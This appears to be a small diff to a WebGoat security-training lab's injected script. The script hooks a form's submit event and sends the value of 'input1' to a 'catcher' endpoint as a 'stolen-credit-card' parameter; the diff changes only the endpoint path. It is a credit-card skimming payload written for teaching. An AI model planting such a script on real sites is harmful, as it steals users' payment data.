@@ -2,7 +2,7 @@
 	document.getElementById('message').remove();
 	const form = document.form;
 	form.addEventListener('submit', (event) => {
-		fetch(`/localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card=${form.input1.value}`);
+		fetch(`/WebGoat/catcher?PROPERTY=yes&stolen-credit-card=${form.input1.value}`);
 	});
 	form.input2.value = '000';
 </script>
